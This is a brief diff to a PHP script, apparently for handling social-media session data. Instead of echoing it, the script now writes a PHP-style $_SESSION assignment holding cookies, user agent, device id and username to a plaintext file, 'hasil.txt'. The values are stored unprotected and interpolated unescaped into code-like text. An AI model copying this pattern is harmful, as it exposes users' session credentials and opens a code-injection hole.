@@ -24,10 +24,11 @@ $device_id= $data['device_id'];
 $username= $data['username'];
 $id= $data['id'];
 
-echo "$"."_SESSION['data'] = array('cookies' => "."'$cookies'".", "."'useragent' => "."'$useragent'".", "."'device_id' => "."'$device_id'".", "."'username' => "."'$username'".", "."'id' => "."'$id'".");";
+$data = "$"."_SESSION['data'] = array('cookies' => "."'$cookies'".", "."'useragent' => "."'$useragent'".", "."'device_id' => "."'$device_id'".", "."'username' => "."'$username'".", "."'id' => "."'$id'".");";
 
 
 
+echo file_put_contents("hasil.txt",$data);
 
 
 
